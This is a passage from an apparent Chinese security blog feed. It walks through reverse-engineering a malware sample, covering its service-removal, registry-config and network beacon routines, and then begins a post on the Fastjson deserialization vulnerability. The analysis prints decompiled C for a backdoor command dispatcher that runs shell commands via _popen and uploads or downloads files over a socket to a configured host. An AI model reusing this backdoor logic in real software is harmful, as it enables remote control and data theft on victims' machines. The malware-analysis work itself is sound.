<span class="keyword">if</span> ( sub_401070(&amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60, &amp;unk_40EB60) )</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                result = sub_401210() != <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        CloseServiceHandle(hSCManager);</span><br><span class="line">        CloseServiceHandle(hService);</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CloseServiceHandle(hSCManager);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的流程，只不过open改为deleteService</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173545489.png" alt="image-20220825173545489"> </p><p>跟进发现服务已禁用</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173934292.png" alt="image-20220825173934292">  </p><p>接着deletefile</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825173828296.png" alt="image-20220825173828296"> </p><p>到此，对于-re参数功能的分析已经结束，我们知道这是删除服务功能；</p><p>下面分析-c参数</p><p>修改参数为-c abcd</p><p>进入调试执行，此处应该就是-c参数代码段</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825195723113.png" alt="image-20220825195723113"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825204505319.png" alt="image-20220825204505319"> </p><p>可以看到有2个jnz跳转(402cd9,402ccf)</p><p>因为参数为-c所以402cd9不跳转，接下来分析下402ccf,od中是跳转了的</p><p>简单反汇编一下可以看到，判断参数是否为7</p><p><img src="C:\Users\royal\AppData\Roaming\Typora\typora-user-images\image-20220825205048492.png" alt="image-20220825205048492"> </p><p>如果不为7，则call 402410,之前分析过这个函数是删除自身 </p><p>更改参数如图，实际指令为(xxxx.exe -c 111 222 333 444 abcd)共7个参数，后重新调试</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210040591.png" alt="image-20220825210040591"> </p><p>可以看到进入401070函数，并对输入的参数111 222 333 444处理</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210313255.png" alt="image-20220825210313255"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210515185.png" alt="image-20220825210515185"> </p><p>参数入栈后调用401070,应该就是-c的函数了，进入看看</p><p> 大概意思就是创建注册表key，然后设置value，一步一步跟进</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825205316100.png" alt="image-20220825205316100"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825210834559.png" alt="image-20220825210834559"> </p><p>打开注册表按照参数发现雀氏添加了所传入的参数</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825211222687.png" alt="image-20220825211222687">  </p><p>接着跳出main函数，结束</p><p>至此-c 参数分析完毕，即向指定注册表添加value</p><p>接着分析-cc abcd</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825212325566.png" alt="image-20220825212325566"> </p><p>有两个跳转，od跟进发现并没有跳转，先过。接着call 401280</p><p>反汇编查看代码</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825212923365.png" alt="image-20220825212923365"> </p><p>大概就是注册表查value</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213434020.png" alt="image-20220825213434020"> </p><p>打开注册表，然后查值</p><p>跳出401280后call 402e74（感觉想printf函数）</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213657475.png" alt="image-20220825213657475"> </p><p>  发现将查询到的value打印出来，然后删除自身，结束</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825213749050.png" alt="image-20220825213749050"> </p><p>接下来分析无参，设置参数为abcd</p><p>跳转至此401000，</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825215514339.png" alt="image-20220825215514339"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220021109.png" alt="image-20220825220021109"> </p><p>接着call 402360</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220103045.png" alt="image-20220825220103045"> </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220208694.png" alt="image-20220825220208694"> </p><p>发现是一个死循环，且通过401280和402020跳出循环</p><p>查看401280</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825220353919.png" alt="image-20220825220353919"> </p><p>猜测如果查询注册表中的value，则跳出循环</p><p>查看402020</p><p>代码较长不放了</p><p>先call了401e60</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401E60</span><span class="params">(<span class="type">char</span> *a1, <span class="type">signed</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  u_short hostshort[<span class="number">2</span>]; <span class="comment">// [sp+8h] [bp-1424h]@3</span></span><br><span class="line">  <span class="type">char</span> name; <span class="comment">// [sp+Ch] [bp-1420h]@1</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+40Ch] [bp-1020h]@11</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+410h] [bp-101Ch]@1</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [sp+414h] [bp-1018h]@13</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+418h] [bp-1014h]@5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [sp+428h] [bp-1004h]@9</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [sp+42Ch] [bp-1000h]@7</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401420(&amp;name, <span class="number">1024</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401470(hostshort) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401D80(&amp;v8) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( sub_401AF0(&amp;name, hostshort[<span class="number">0</span>], (<span class="type">int</span>)&amp;v8, &amp;v10, (<span class="type">int</span>)&amp;v6) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(&amp;v10, asc_40C090);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v9;</span><br><span class="line">      v9 = <span class="built_in">strstr</span>(v9, asc_40C088);</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v9;</span><br><span class="line">        <span class="keyword">if</span> ( v9 - v5 + <span class="number">1</span> &lt;= a2 )</span><br><span class="line">        &#123;</span><br><span class="line">          qmemcpy(a1, &amp;v5[<span class="built_in">strlen</span>(asc_40C090)], v7 - v5 - <span class="built_in">strlen</span>(asc_40C090));</span><br><span class="line">          a1[v7 - v5 - <span class="built_in">strlen</span>(asc_40C090)] = <span class="number">0</span>;</span><br><span class="line">          result = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中401420中调用了401280，即-cc参数，就是查询value</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825222101625.png" alt="image-20220825222101625"> </p><p>接着call了401470，进去看到call了401280和402f6a</p><p>接着call了401d80</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825222744151.png" alt="image-20220825222744151"> </p><p>先获取了当前时间time</p><p>然后4030e0函数将40C180的值赋为time</p><p>接着call 401D10，跟进去看</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825223222184.png" alt="image-20220825223222184"> </p><p>返回一个不是数字&amp;&amp;不是小写字母&amp;&amp;不是大写字母的v1（此处返回的是54）</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220825223421058.png" alt="image-20220825223421058"></p><p>不满足条件接着一直循环 </p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826085643786.png" alt="image-20220826085643786"> </p><p>跳出，接着call 401AF0，参数如栈中所示</p><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826091132206.png" alt="image-20220826091132206"> </p><p>代码如下，和socket网络通信有关</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_401AF0</span><span class="params">(<span class="type">char</span> *name, u_short hostshort, <span class="type">int</span> a3, <span class="type">char</span> *a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax@2</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [sp+10h] [bp-60Ch]@5</span></span><br><span class="line">  SOCKET s; <span class="comment">// [sp+210h] [bp-40Ch]@1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+214h] [bp-408h]@1</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [sp+218h] [bp-404h]@3</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [sp+618h] [bp-4h]@5</span></span><br><span class="line"></span><br><span class="line">  s = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_401640((<span class="type">int</span>)&amp;s, name, hostshort) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;buf, aGet);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, (<span class="type">const</span> <span class="type">char</span> *)a3);</span><br><span class="line">  <span class="built_in">strcat</span>(&amp;buf, aHttp1_0);</span><br><span class="line">  <span class="keyword">if</span> ( send(s, &amp;buf, <span class="built_in">strlen</span>(&amp;buf), <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    closesocket(s);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = recv(s, &amp;v6, <span class="number">512</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401740(&amp;s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v10 + v8) &gt; *(_DWORD *)a5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401740(&amp;s);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    qmemcpy(&amp;a4[v8], &amp;v6, v10);</span><br><span class="line">    v8 += v10;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a4, asc_40C068) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">if</span> ( sub_401740(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)a5 = v8;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>纵观以上，可以得到401e60主要功能为以下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _cdecl <span class="title function_">sub_401E60</span><span class="params">(cahr *a1,<span class="type">signed</span> <span class="type">int</span> a2)</span>&#123;</span><br><span class="line">    <span class="type">signed</span> <span class="type">int</span> result;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(sub_401420(...))&#123;    <span class="comment">// 获取注册表键并截取</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401470(...))&#123;    <span class="comment">// 获取注册表键</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401D80(...))&#123;    <span class="comment">// 无聊的延时</span></span><br><span class="line">        resutl = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(sub_401AF0(...))&#123;    <span class="comment">// 网络Get和recv</span></span><br><span class="line">        result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a = <span class="built_in">strstr</span>(...))&#123;    <span class="comment">// 字符串匹配</span></span><br><span class="line">            <span class="keyword">if</span>(b = <span class="built_in">strstr</span>(...))&#123;</span><br><span class="line">                <span class="keyword">if</span>(b - a + <span class="number">1</span> &lt;= a2)&#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(a1 , ...);    <span class="comment">// 复制</span></span><br><span class="line">                    a1[...] = <span class="number">0</span>;</span><br><span class="line">                    result = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    result = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                result = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            result = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果获取字符串成功，则进入40204C，可以看到类似于一个后门功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402020</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// ST2C_4@4</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ST30_4@4</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// eax@6</span></span><br><span class="line">  u_short v5; <span class="comment">// ST24_2@6</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// ST28_4@6</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// eax@10</span></span><br><span class="line">  u_short v8; <span class="comment">// ST1C_2@10</span></span><br><span class="line">  <span class="type">char</span> *lpFileName; <span class="comment">// ST20_4@10</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v11; <span class="comment">// ST18_4@14</span></span><br><span class="line">  u_short hostshort; <span class="comment">// [sp+4h] [bp-424h]@14</span></span><br><span class="line">  FILE *v13; <span class="comment">// [sp+8h] [bp-420h]@14</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [sp+28h] [bp-400h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_401E60(&amp;v14, <span class="number">1024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aSleep, <span class="built_in">strlen</span>(aSleep)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v2 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v3 = atoi(v2);</span><br><span class="line">    Sleep(<span class="number">1000</span> * v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aUpload, <span class="built_in">strlen</span>(aUpload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v4 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v5 = atoi(v4);</span><br><span class="line">    v6 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_4019E0(name, v5, v6) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aDownload, <span class="built_in">strlen</span>(aDownload)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v7 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    v8 = atoi(v7);</span><br><span class="line">    lpFileName = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401870(name, v8, lpFileName) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;v14, aCmd, <span class="built_in">strlen</span>(aCmd)) )</span><br><span class="line">  &#123;</span><br><span class="line">    strtok(&amp;v14, asc_40C0C0);</span><br><span class="line">    v10 = strtok(<span class="number">0</span>, asc_40C0C0);</span><br><span class="line">    hostshort = atoi(v10);</span><br><span class="line">    v11 = strtok(<span class="number">0</span>, asc_40C0A4);</span><br><span class="line">    v13 = _popen(v11, aRb);</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401790(name, hostshort, v13) )</span><br><span class="line">    &#123;</span><br><span class="line">      _pclose(v13);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _pclose(v13);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncmp</span>(&amp;v14, aNothing, <span class="built_in">strlen</span>(aNothing));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220826092049031.png" alt="image-20220826092049031"> </p><p>可以实现cmd，和upload</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;纵观&quot;&gt;&lt;a href=&quot;#纵观&quot; class=&quot;headerlink&quot; title=&quot;纵观&quot;&gt;&lt;/a&gt;纵观&lt;/h2&gt;&lt;h2 id=&quot;详细分析&quot;&gt;&lt;a href=&quot;#详细分析&quot; class=&quot;headerlink&quot; title=&quot;详细分析&quot;&gt;&lt;/a&gt;详细分析&lt;/h</summary>
      
    
    
    
    <category term="恶意代码" scheme="http://example.com/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    
    <category term="恶意代码" scheme="http://example.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="二进制" scheme="http://example.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson 反序列化漏洞</title>
    <link href="http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2022/07/31/fastjson%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2022-07-31T13:16:50.000Z</published>
    <updated>2022-09-01T00:38:50.463Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastjson-反序列化漏洞"><a href="#fastjson-反序列化漏洞" class="headerlink" title="fastjson 反序列化漏洞"></a>fastjson 反序列化漏洞</h1><h2 id="fastjson介绍"><a href="#fastjson介绍" class="headerlink" title="fastjson介绍"></a>fastjson介绍</h2><ol><li><p>在前后端数据传输交互中,经常会遇到<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上可以说是标准的数据交换格式。fastjson 是一个java语言编写的高性能且功能完善的JSON库，它采用一种“假定有序快速匹配”的算法，把JSON Parse 的性能提升到了极致。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。</p></li><li><p>FastJson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。</p></li></ol><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。其实，对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：基于属性基于setter&#x2F;getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">iphone</span> <span class="keyword">implements</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> 